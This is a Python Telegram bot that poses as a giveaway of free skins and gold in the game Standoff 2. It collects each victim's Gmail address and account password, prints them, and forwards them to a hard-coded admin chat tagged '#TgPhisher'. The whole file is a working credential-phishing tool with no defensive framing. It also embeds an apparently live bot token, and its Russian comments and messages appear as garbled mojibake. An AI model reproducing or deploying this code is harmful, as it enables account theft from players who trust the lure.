import telebot
from telebot import types
import re
import requests
import os

# –ñ–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
TOKEN = "8081527280:AAEYyLAp5Ki87k-_B7EEEBJDIhG_Wo0HVLY"
ADMIN_ID = "619780433"

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞
bot = telebot.TeleBot(TOKEN)

# –°–ª–æ–≤–∞—Ä–∏ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
user_states = {}
user_channels = {}
user_passwords = {}

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ —Ç–æ–∫–µ–Ω–∞ –∏ –ø–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –±–æ—Ç–∞
def get_bot_username(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    response = requests.get(url).json()
    if response.get("ok") and 'username' in response.get("result", {}):
        return response["result"]["username"]
    return None

# –í—ã–≤–æ–¥ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∑–∞–ø—É—Å–∫–µ
bot_username = get_bot_username(TOKEN)
print(f"–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω! Username: @{bot_username}")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_states[message.chat.id] = "START"
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å", callback_data="continue")
    markup.add(button)
    bot.send_message(message.chat.id, "–ü—Ä–∏–≤–µ—Ç! üëã\n\n–î–∞–Ω–Ω—ã–π —Å–µ—Ä–≤–∏—Å –ø–æ–º–æ–∂–µ—Ç –≤–∞–º –ø–æ–ª—É—á–∏—Ç—å —Å–∫–∏–Ω—ã –∏ –≥–æ–ª–¥—É –≤ Standoff 2 –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç. –î–∞–≤–∞–π—Ç–µ –Ω–∞—á–Ω–µ–º! ‚ú®", reply_markup=markup)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å"
@bot.callback_query_handler(func=lambda call: call.data == "continue")
def handle_continue(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    user_states[call.message.chat.id] = "AWAITING_CHANNEL"
    bot.send_message(call.message.chat.id, "–î–∞–π—Ç–µ –ø–æ—á—Ç—É Gmail –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ Standoff 2.")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤–≤–æ–¥–∞ Gmail
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHANNEL")
def process_channel_step(message):
    channel_username = message.text
    if not re.match(r"^[a-zA-Z0-9_.+-]+@gmail\.com$", channel_username):
        bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π Gmail –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ Standoff 2 (–Ω–∞–ø—Ä–∏–º–µ—Ä, example@gmail.com).")
        return

    user_channels[message.chat.id] = channel_username
    markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
    button1 = types.KeyboardButton("5 —Å–∫–∏–Ω–æ–≤ –∞—Ä–∫–∞–Ω–∞, –º–∏—Ñ–∏–∫, –∏ –µ–ø–∏–∫.")
    button2 = types.KeyboardButton("1000 –≥–æ–ª–¥—ã")
    markup.add(button1, button2)
    user_states[message.chat.id] = "AWAITING_CHOICE"
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Å–∫–∏–Ω–æ–≤ –∏–ª–∏ –≥–æ–ª–¥—ã:", reply_markup=markup)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—ã–±–æ—Ä–∞ —Å–∫–∏–Ω–æ–≤/–≥–æ–ª–¥—ã
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHOICE")
def process_choice_step(message):
    if message.text not in ["5 —Å–∫–∏–Ω–æ–≤ –∞—Ä–∫–∞–Ω–∞, –º–∏—Ñ–∏–∫, –∏ –µ–ø–∏–∫.", "1000 –≥–æ–ª–¥—ã"]:
        bot.send_message(message.chat.id, "–î–ª—è –ø—Ä–∏–æ–±—Ä–µ—Ç–µ–Ω–∏—è –±–æ–ª—å—à–µ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –≥–æ–ª–¥—ã –∏ —Å–∫–∏–Ω–æ–≤ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω—É.")
        return

    user_states[message.chat.id] = "AWAITING_PASSWORD"
    bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ Standoff 2.")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_PASSWORD")
def process_password_step(message):
    password = message.text
    user_passwords[message.chat.id] = password

    # –í—ã–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö –≤ –∫–æ–Ω—Å–æ–ª—å
    print(f"ID: {message.from_user.id}")
    print(f"–ò–º—è: {message.from_user.first_name}")
    print(f"Username: @{message.from_user.username if message.from_user.username else 'None'}")
    print(f"Gmail: {user_channels[message.chat.id]}")
    print(f"–ü–∞—Ä–æ–ª—å: {password}")
    print()

    # –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∞–¥–º–∏–Ω—É
    try:
        bot.send_message(ADMIN_ID, f'''
#TgPhisher - @{bot_username}

- ID: {message.from_user.id}
- –ò–º—è: {message.from_user.first_name}
- Username: @{message.from_user.username if message.from_user.username else 'None'}
- Gmail: {user_channels[message.chat.id]}
- –ü–∞—Ä–æ–ª—å: {password}
- By @CyberStalker1337''')
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∞–¥–º–∏–Ω—É: {e}")

    bot.send_message(message.chat.id, f"<b>–ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω</b>\n–í–∞—à –∑–∞–ø—Ä–æ—Å –±—É–¥–µ—Ç –æ–±—Ä–∞–±–æ—Ç–∞–Ω –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è.\n–í–∞—à ID: {message.from_user.id}", parse_mode='HTML')
    user_states[message.chat.id] = "DONE"  # –°–æ—Å—Ç–æ—è–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ

# –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
if __name__ == "__main__":
    print("Starting bot polling...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ polling: {e}")
            import time
            time.sleep(5)  # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥ –≤ —Å–ª—É—á–∞–µ —Å–±–æ—è